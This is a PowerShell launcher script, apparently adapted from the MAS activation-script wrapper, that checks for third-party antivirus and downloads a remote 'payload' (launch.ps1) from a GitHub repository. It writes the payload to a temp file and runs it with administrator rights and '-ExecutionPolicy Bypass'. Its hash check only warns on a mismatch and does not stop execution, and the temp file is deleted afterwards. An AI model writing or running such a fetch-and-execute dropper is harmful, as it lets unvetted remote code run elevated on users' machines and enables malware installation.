# Optimized PowerShell Wrapper for .ps1 Payload
# Based on the MAS architecture for secure delivery

if (-not $args) { 
    Write-Host 'Lab Script Initialized...' -ForegroundColor Cyan 
}

& {
    $psv = (Get-Host).Version.Major
    $troubleshoot = 'https://massgrave.dev/troubleshoot'

    # 1. Check for Full Language Mode
    if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
        Write-Host "PowerShell is not running in Full Language Mode." -ForegroundColor Red
        return
    }

    # 2. Function to check for 3rd Party Antivirus
    function Check3rdAV {
        $cmd = if ($psv -ge 3) { 'Get-CimInstance' } else { 'Get-WmiObject' }
        $avList = & $cmd -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
        if ($avList) {
            Write-Host "Note: 3rd party AV detected: $($avList -join ', ')" -ForegroundColor Yellow
        }
    }

    # 3. Secure Download (TLS 1.2)
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

    $URLs = @(
        'https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/launch.ps1'
    )

    Write-Progress -Activity "Downloading Payload..." -Status "Connecting to GitHub"
    $response = $null
    foreach ($URL in $URLs) {
        try {
            if ($psv -ge 3) { $response = Invoke-RestMethod $URL } 
            else { $w = New-Object Net.WebClient; $response = $w.DownloadString($URL) }
            break
        } catch { continue }
    }
    Write-Progress -Activity "Downloading..." -Status "Done" -Completed

    if (-not $response) {
        Write-Host "Failed to download script. Check internet connection." -ForegroundColor Red
        return
    }

    # 4. Integrity Verification (IMPORTANT: Update this hash!)
    # To get your hash, run: (Get-FileHash .\simplier.ps1).Hash
    $releaseHash = '9ca14955682871a7d4cb47e58840ba42bf2ff1840c27e55776924d529668a331'
    
    $stream = New-Object IO.MemoryStream
    $writer = New-Object IO.StreamWriter $stream
    $writer.Write($response)
    $writer.Flush()
    $stream.Position = 0
    $hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
    
    if ($hash -ne $releaseHash) {
        Write-Warning "Hash Mismatch! File may have been tampered with."
        Write-Host "Current Hash: $hash"
        # In a real test, you would 'return' here to stop execution
    }

    # 5. Prepare Temporary File
    $rand = [Guid]::NewGuid().Guid
    $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
    
    # Change extension to .ps1
    $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\LabScript_$rand.ps1" } 
                else { "$env:USERPROFILE\AppData\Local\Temp\LabScript_$rand.ps1" }

    Set-Content -Path $FilePath -Value $response

    # 6. Execute as PowerShell with Bypass Policy
    Write-Host "Launching script with elevated privileges..." -ForegroundColor Green
    
    if ($psv -lt 3) {
        # Legacy Support
        saps -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File ""$FilePath""" -Verb RunAs -Wait
    } else {
        # Modern Execution
        saps -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Normal -File ""$FilePath""" -Wait -Verb RunAs
    }

    # 7. Cleanup
    if (Test-Path $FilePath) {
        Remove-Item $FilePath -Force
        Write-Host "Temporary files cleared." -ForegroundColor Gray
    }
}